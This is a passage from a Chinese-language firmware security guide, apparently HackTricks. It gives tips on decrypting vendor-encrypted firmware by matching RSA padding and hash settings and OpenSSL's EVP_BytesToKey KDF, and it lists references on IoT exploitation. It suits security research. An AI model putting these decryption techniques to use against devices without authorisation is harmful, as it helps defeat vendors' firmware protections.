- 使用 KMS 实际采用的精确填充/哈希组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败、默认 OAEP 解密失败，**并不能**证明 key 不正确；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，在尝试 AES-CBC 解密前，需精确复现厂商的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备通常使用 MD5）。

这样一来，“加密固件”就成了一个更通用的问题：**恢复设备端的操作密钥，然后离线复现精确的解包和 KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [使用 Claude 破解固件：资深级技能，初级级自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT Hacking：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用废弃硬件中的零日漏洞——Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看见了 mi：现在你被 Pwned 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 从充电口连接器利用 Tesla Wall Connector - 第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过无线更新利用 Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [在 QEMU 上 ROOT Tesla OS，第 2 部分：调试与修复](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
